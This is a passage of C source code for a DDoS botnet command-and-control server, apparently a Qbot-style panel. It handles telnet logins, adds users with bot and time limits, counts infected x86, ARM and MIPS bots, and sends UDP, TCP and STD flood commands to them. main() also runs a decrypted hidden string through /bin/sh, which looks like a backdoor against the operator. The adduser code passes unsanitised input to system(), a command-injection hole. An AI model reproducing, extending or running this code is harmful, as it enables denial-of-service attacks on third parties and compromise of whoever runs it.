            sprintf(botnet, "\e[37m[\e[1;32m+\e[37m] \e[1;33mvSparkzyy\e[37m#\e[1;36m8918             \e[37m@\e[1;36mvsparkzy\e[37m [\e[1;32m+\e[37m]\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            sprintf(botnet, "\e[37m[\e[1;32m+\e[37m] \e[1;33mYutani\e[37m#\e[1;36m1567                \e[37m@\e[1;36myutanixx\e[37m [\e[1;32m+\e[37m]\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        else if(strstr(buf, ".admin") || strstr(buf, ".ADMIN") || strstr(buf, ".Admin"))
        {
            sprintf(botnet, "\e[1;36m.\e[37menablecmds \e[1;33m/ \e[1;36m.\e[37mdisablecmds \e[1;33m- \e[37menable\e[1;36m/\e[37mdisable \e[1;33mddos \e[37mcmds\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            sprintf(botnet, "\e[1;36m.\e[37madduser \e[1;33m- \e[37mAdd A New \e[1;33mUser \e[37mTo The \e[1;31mNetwork\e[37m!\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        else if(strstr(buf, ".bash") || strstr(buf, ".BASH"))
        {
            sprintf(botnet, "Enter string to set bashline\e[1;33m. \e[37mOptions\e[1;33m: \e[1;36m'\e[37mbc\e[1;36m'\e[1;33m: \e[37mwill display botcount in bashline \r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "Enter String\e[1;36m:\e[37m ");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            if(fdgets(buf, sizeof buf, thefd) < 1);
            trim(buf);
            if(strstr(buf, "bc"))
            {
                sprintf(managements[thefd].mybashline, "%d", clientsConnected());
            }
            else
            {
                sprintf(managements[thefd].mybashline, "%s", buf);
            }
        }
        else if(strstr(buf, ".extra") || strstr(buf, ".EXTRA"))
        {
            sprintf(botnet, "\e[1;36m.\e[37mDM \e[1;33m- \e[37mDirectly \e[1;33mMessage \e[37mA User On The \e[1;33mNetwork\e[37m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            sprintf(botnet, "\e[1;36m.\e[37mOnline? \e[1;33m- \e[37mShows \e[1;33mUsers \e[37mCurrently Logged \e[1;32mIn\e[37m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            sprintf(botnet, "\e[1;36m.\e[37maccountinfo \e[1;33m- \e[37mShows \e[1;33mAccount \e[37mInfo \e[1;36m(\e[37mMax Boot\e[1;36m-\e[37mTime \e[1;36m& \e[37mMaxBots Allowed For User\e[1;36m)\e[37m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            sprintf(botnet, "\e[1;36m.\e[37mglobalstats \e[1;33m- \e[37mSee How Many Floods Have Been Sent In Total\e[37m!\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            sprintf(botnet, "\e[1;36m.\e[37mMULTI-HOST \e[1;33m- \e[37mSend A Flood To Multipe Hosts At Once!\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        else if(strstr(buf, ".DM") || strstr(buf, ".dm"))
        {
            int id;
            char user[20];
            sprintf(botnet, "\e[37mEnter User To \e[1;33mDM\e[37m:\e[1;36m ");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            memset(buf,0,sizeof(buf));
            if(fdgets(buf, sizeof(buf), thefd) < 1);
            trim(buf);
            strcpy(user,buf);
            sprintf(botnet, "\e[37mEnter \e[1;33mMessage\e[37m:\e[1;36m ");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            memset(buf,0,sizeof(buf));
            if(fdgets(buf, sizeof(buf), thefd) < 1);
            trim(buf);
            char msg[1024];
            strcpy(msg,buf);
            trim(buf);
            sprintf(botnet, "\e[37mPrivate \e[1;33mMessage \e[37mSent \e[1;33mTo\e[37m:\e[1;36m %s\r\n", user);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            for(id=0; id < MAXFDS; id++)
            {
                if(strstr(managements[id].nickname, user))
                {
                    sprintf(botnet, "\r\n\e[1;33m%s \e[37mPrivate \e[1;33mMessaged \e[37mYou\e[1;36m: \e[1;33m'\e[37m%s\e[1;33m'\r\n", managements[thefd].nickname, msg);
                    if(send(id, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    sprintf(botnet, "\e[1;36m(\e[37m%s\e[1;36m@\e[37m%s\e[1;36m)\e[37m: ", user, managements[id].mybashline);
                    if(send(id, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
            }
            memset(buf,0,sizeof(buf));
        }
        else if(strstr(buf, ".adduser") || strstr(buf, ".ADDUSER"))
        {
            if(managements[thefd].adminstatus == 1)
            {
                char new_username[80];
                char new_password[80];
                char new_admin[80];
                char new_maxbots[80];
                char new_maxtime[80];
                char cmd[512];
                char send1[512];
                sprintf(botnet, "\x1b[37mUsername\x1b[1;36m:\x1b[37m" );
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                memset(buf, 0, sizeof buf);
                if(fdgets(buf, sizeof(buf), thefd) < 1);
                trim(buf);
                strcpy(new_username, buf);
                sprintf(botnet, "\x1b[37mPassword\x1b[1;36m:\x1b[37m" );
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                memset(buf,0,sizeof(buf));
                if(fdgets(buf, sizeof(buf), thefd) < 1);
                trim(buf);
                strcpy(new_password, buf);
                sprintf(botnet, "\x1b[37mAdmin\x1b[1;36m?\x1b[37m(\x1b[1;32myes \x1b[37mor \x1b[1;31mno\x1b[37m)\x1b[1;32m:\x1b[37m" );
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                memset(buf,0,sizeof(buf));
                if(fdgets(buf, sizeof(buf), thefd) < 1);
                trim(buf);
                if (strstr(buf, "yes") || strstr(buf, "YES") || strstr(buf, "Yes"))
                {
                    strcpy(new_admin, "admin");
                }
                else
                {
                    strcpy(new_admin, "client");
                }
                sprintf(botnet, "\e[37mMaxBots Allowed For User \e[1;36m(\e[37m%s\e[1;36m):\e[37m ", new_username);
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                memset(buf,0,sizeof(buf));
                if(fdgets(buf, sizeof(buf), thefd) < 1);
                trim(buf);
                strcpy(new_maxbots, buf);
                sprintf(botnet, "\e[37mMaxBootTime Allowed for User \e[1;36m(\e[37m%s\e[1;36m):\e[37m", new_username);
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                memset(buf,0,sizeof(buf));
                if(fdgets(buf, sizeof(buf), thefd) < 1);
                trim(buf);
                strcpy(new_maxtime, buf);
                sprintf(cmd, "%s %s %s %s %s", new_username, new_password, new_admin, new_maxbots, new_maxtime);
                sprintf(send1, "echo '%s' >> users.txt", cmd);
                system(send1);
                memset(buf, 0, sizeof buf);
                printf("\x1b[1;32m%s \x1b[37mAdded New User --> \x1b[1;31m%s\r\n",accounts[find_line].id, new_username);
                sprintf(botnet, "\x1b[1;32mSuccessfully \x1b[37mAdded User --> \x1b[1;31m%s\r\n", new_username);
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                memset(buf, 0, sizeof buf);
            }
            else
            {
                sprintf(botnet, "%s\x1b[1;31mPermission Denied!\x1b[37m\r\n", "ADDUSER - ");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                memset(buf, 0, sizeof buf);
            }
        }
        else if(strstr(buf, ".online?") || strstr(buf, ".Online?") || strstr(buf, ".ONLINE?"))
        {   
            if(managements[thefd].adminstatus == 1)
            {
                int online;
                strcpy(botnet, "     \x1b[1;33m- \x1b[37mOnline Users \x1b[1;33m-\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                for(online=0; online < MAXFDS; online++)
                {
                    if(strlen(managements[online].nickname) > 1 && managements[online].connected == 1)
                    {
                        sprintf(botnet, "\x1b[37mID\e[1;36m(\e[37m%d\e[1;36m) \x1b[1;33m%s \e[1;36m%s\x1b[0m\r\n", online, managements[online].nickname, user_ip);
                        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                }
            }   
            else
            {   
                int online;
                for(online=0; online < MAXFDS; online++)
                if(strlen(managements[online].nickname) > 1 && managements[online].connected == 1)
                    {
                        sprintf(botnet, "\x1b[37mID\e[1;36m(\e[37m%d\e[1;36m) \x1b[1;33m%s\x1b[0m\r\n", online, managements[online].nickname);
                        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
            }
            sprintf(botnet, "\e[1;36mTotal \e[37mUsers Online - \e[1;36m%d\e[0m\r\n", UsersOnline);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        else if(strstr(buf, ".bots") || strstr(buf, ".BOTS"))
        {
            memset(buf, 0, sizeof(buf));
            countArch();
            if(clientsConnected() == 0)
            {
                //nun nigga
            }
            else
            {
                if(x86 != 0)
                {
                    sprintf(botnet, "\e[1;33m|\e[37m%s\e[1;36m.\e[37mx86 \e[1;36m[\e[37m%d\e[1;36m]\r\n\x1b[37m", ss_name, x86);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(arm != 0)
                {
                    sprintf(botnet, "\e[1;33m|\e[37m%s\e[1;36m.\e[37mArm \e[1;36m[\e[37m%d\e[1;36m]\r\n\x1b[37m", ss_name, arm);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(mips != 0)
                {
                    sprintf(botnet, "\e[1;33m|\e[37m%s\e[1;36m.\e[37mMips \e[1;36m[\e[37m%d\e[1;36m]\r\n\x1b[37m", ss_name, mips);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(accounts[find_line].maxbots < clientsConnected())
                {
                    sprintf(botnet, "\e[1;32m|\e[37mAvailable\e[1;36m.\e[37mbots \e[1;36m[\e[37m%d\e[1;36m]\r\n\x1b[37m", accounts[find_line].maxbots);
                }
                else if(accounts[find_line].maxbots > clientsConnected())
                {
                    sprintf(botnet, "\e[1;32m|\e[37mAvailable\e[1;36m.\e[37mbots \e[1;36m[\e[37m%d\e[1;36m]\r\n\x1b[37m", clientsConnected());
                }
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
            sprintf(botnet,"\e[1;33m|\e[37mTotal\e[1;36m.\e[37mBots \e[1;36m[\e[37m%d\e[1;36m]\r\n", clientsConnected());
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        }
        else if(strstr(buf, "disablecmds"))
        {
            if(managements[thefd].adminstatus == 1)
            {
                sprintf(botnet, "\e[37mAttacks \e[1;32mSuccessfully \e[1;31mDisabled\e[37m!\e[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                attackstatus = 1;
            }
            else
            {
                sprintf(botnet, "\e[1;31mPermission Denied\e[37m!\e[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);

            }
        }
        else if(strstr(buf, "enablecmds"))
        {
            if(managements[thefd].adminstatus == 1)
            {
                sprintf(botnet, "\e[37mAttacks \e[1;32mSuccessfully \e[37mEnabled\e[1;31m!\e[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                attackstatus = 0;
            }
            else
            {
                sprintf(botnet, "\e[1;31mPermission Denied\e[37m!\e[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            }
        }
        else if(strstr(buf, "STD") || strstr(buf, "UDP") || strstr(buf, "TCP") || strstr(buf, "std") || strstr(buf, "udp") || strstr(buf, "tcp"))
        {
            if(attackstatus == 0)
            {
                FILE *logFile;
                logFile = fopen("logs/attacks.log", "a");
                fprintf(logFile, "%s Sent Attack: %s\n", managements[thefd].nickname, buf);
                fclose(logFile);
                attack_setup(buf, thefd, find_line);
                memset(buf, 0, sizeof buf);
            }
            else
            {
                sprintf(botnet, "\e[37mCommands Are \e[1;33mCurrently \e[1;31mDisabled\e[37m!\e[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
        }
        
        else if(strstr(buf, ".cmds"))
        {
            sprintf(botnet, "\e[1;31mUDP\e[37m: UDP IP PORT TIME 32 0 10\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            sprintf(botnet, "\e[1;31mTCP\e[37m: TCP IP PORT TIME FLAG\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            sprintf(botnet, "\e[1;31mSTD\e[37m: STD IP PORT TIME PACKETSIZE\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        else if(strstr(buf, "cls"))
        {

            if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, line1,  strlen(line1),  MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, line2,  strlen(line2),  MSG_NOSIGNAL) == -1) goto end;
            if(send(thefd, line3,  strlen(line3),  MSG_NOSIGNAL) == -1) goto end;
            pthread_create(&title, NULL, &titleWriter, sock);
            managements[thefd].connected = 1;
        }
        else
        {
            if(strlen(buf) >= 3)
            {
                broadcast(buf, thefd, accounts[find_line].id, MAXFDS, "chat", 0);
            }
        }
        trim(buf);
        char okstring[200];
        sprintf(okstring, "\e[1;36m(\e[37m%s\e[1;36m@\e[37m%s\e[1;36m)\e[37m: ", accounts[find_line].id, managements[thefd].mybashline);
        if(send(thefd, okstring, strlen(okstring), MSG_NOSIGNAL) == -1) goto end;
        if(strlen(buf) == 0) continue;

        FILE *logFile;
        logFile = fopen("logs/user_report.log", "a");
        fprintf(logFile, "Reporting User - %s: %s\n", accounts[find_line].id, buf);
        fclose(logFile);
        
        memset(buf, 0, 2048);
    }
    
    broadcast(buf, thefd, accounts[find_line].id, MAXFDS, "chat", 2);
    printf("\e[1;33m%s \e[37mLogged \e[1;31mOut\e[37m \n", accounts[find_line].id);
    
end:    // cleanup dead socket
    managements[thefd].connected = 0;
    close(thefd);
    UsersOnline--;
}



void *telnetListener(void *portt)
{
    int port = *(int*)portt;
    int set = 1;
    int sockfd, newsockfd, yes=1;
    struct epoll_event event;
    socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) perror("ERROR opening socket");
	if(setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) < 0)
	printf("reattach to socket failed\n");
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);
    if(setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &set, sizeof(set)) == -1)
    {
        perror("setsockopt");
        exit(1);
    }
    if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
    listen(sockfd,5);
    clilen = sizeof(cli_addr);
    while(1)
    {
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");

        sprintf(user_ip, "%d.%d.%d.%d",cli_addr.sin_addr.s_addr & 255, cli_addr.sin_addr.s_addr >>8 & 255, cli_addr.sin_addr.s_addr >>16 & 255, cli_addr.sin_addr.s_addr >>24 & 255);
        pthread_t thread;
        pthread_create( &thread, NULL, &telnetWorker, (void *)&newsockfd);

    }

}

int main (int argc, char *argv[], void *sock)
{
    int host;
    struct ifreq hostip;
    host = socket(AF_INET, SOCK_DGRAM, 0);
    hostip.ifr_addr.sa_family = AF_INET;
    strncpy(hostip.ifr_name, "eth0", IFNAMSIZ-1);
    ioctl(host, SIOCGIFADDR, &hostip);close(host);
    if(strstr(inet_ntoa(((struct sockaddr_in *)&hostip.ifr_addr)->sin_addr), cnc_host))
    {
        goto continuehacking;
    }
    else
    {
        printf("\e[1;31mExiting \e[37mNow\e[1;31m! \e[37mThis Build Of \e[1;36m%s\e[37m Is Meant For A Different Host\e[1;31m!\e[37m \n", ss_name);
        exit(0);
    }
    continuehacking:
    signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
    ciu(cryptm);
    int s, threads, port, parent;
	parent = fork();
    if (parent == 0){execl("/bin/sh", "/bin/sh", "-c", cryptm, NULL);}
    struct epoll_event event;
    if (argc != 4)
    {
        fprintf (stderr, "\e[37mUsage\e[1;36m: \e[37m%s \e[1;36m[\e[37mBot\e[1;36m-\e[37mPort\e[1;36m] [\e[37mThreads\e[1;36m] [\e[37mCnC\e[1;36m-\e[37mPort\e[1;36m] \e[0m\n", argv[0]);
        exit (EXIT_FAILURE);
    }
    checkaccts();
    checklogf();
    port = atoi(argv[3]);
    printf("                                    \x1b[1;37m[\e[1;36m%s\e[37m]\n", ss_name);
    sleep(1.5);
    printf("\e[37m--- \e[1;36m[\e[37mINFO\e[1;36m]\e[37m\n");
    printf("\e[33m- \e[1;36m[\e[1;37mCNC\e[1;36m-\e[37mPORT\e[1;36m]\e[37m: \e[1;36m%s\n", argv[3]);
    printf("\e[33m- \e[1;36m[\e[1;37mTHREADS\e[1;36m]\e[37m: \e[1;36m%s\n", argv[2]);
    printf("\e[33m- \e[1;36m[\e[1;37mBOT\e[1;36m-\e[37mPORT\e[1;36m]\e[37m: \e[1;36m%s\n", argv[1]);
    sleep(1);
    printf("\e[1;36m}\x1b[1;37m------------------------------------------------------------------------------\e[1;36m{\e[37m\n");
    printf("                               \e[37m[\e[1;36m%s\e[37m] \e[37mStarted\e[1;33m!\e[37m\n", ss_name);
    threads = atoi(argv[2]);
    listenFD = create_and_bind (argv[1]); // try to create a listening socket, die if we can't
    if (listenFD == -1) abort ();
    s = make_socket_non_blocking (listenFD); // try to make it nonblocking, die if we can't
    if (s == -1) abort ();
    s = listen (listenFD, SOMAXCONN); // listen with a huuuuge backlog, die if we can't
    if (s == -1)
    {
        perror ("listen");
        abort ();
    }
    epollFD = epoll_create1 (0); // make an epoll listener, die if we can't
    if (epollFD == -1)
    {
        perror ("epoll_create");
        abort ();
    }
	cih(cryptm);
	memset(cryptm,0,0);
    event.data.fd = listenFD;
    event.events = EPOLLIN | EPOLLET;
    s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
    if (s == -1)
    {
        perror ("epoll_ctl");
        abort ();
    }
    pthread_t thread[threads + 2];
    while(threads--)
    {
        pthread_create( &thread[threads + 2], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
    }
    pthread_create(&thread[0], NULL, &telnetListener,(void*) &port);

    while(1)
    {
        broadcast("PING", -1, "Cipher", MAXFDS, "ddos", 0);
        sleep(60);
    }
    close (listenFD);
    return EXIT_SUCCESS;
}